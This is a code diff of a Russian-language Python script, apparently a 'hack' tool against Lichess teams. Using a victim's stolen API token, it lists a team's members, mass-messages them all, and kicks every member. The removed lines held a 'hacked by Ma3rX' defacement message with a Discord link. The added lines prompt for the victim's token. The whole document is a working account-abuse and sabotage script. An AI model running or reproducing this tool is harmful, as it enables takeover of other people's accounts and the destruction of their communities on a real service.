@@ -2,10 +2,11 @@ import berserk
 import requests
 import ndjson
 
+from config import *
+
 def hack(token, team):
     msg = """
-    Взломано программой Ma3rX. Вопросы задавайте тут:
-    https://discord.gg/MkYhNErEGN
+    
     """
     heads = {'Authorization': f'Bearer {token}'}
 
@@ -15,13 +16,16 @@ def hack(token, team):
     r = requests.get('https://lichess.org/api/team/'+team+'/users')
     data = r.json(cls=ndjson.Decoder)
 
-    print(data)
+    print(green + "[+] Список пользователей получен!")
 
     session.post('https://lichess.org/team/'+team+'/pm-all', data={'message': msg}, headers=heads).json()
+    print("[+] Рассылка успешна отправлена!")
 
     for i in data:
-        user = i['id']
+        user = i['username']
         client.teams.kick_member(team, user)
-        print(green + f"[+] {user} кикнут!")
+        print(f"[+] {user} кикнут!")
 
+if __name__ == "__main__":
+    hack(token=input(magenta + "[?] Введите токен жертвы: "), team=input(magenta + "[?] ID команды: "))
 
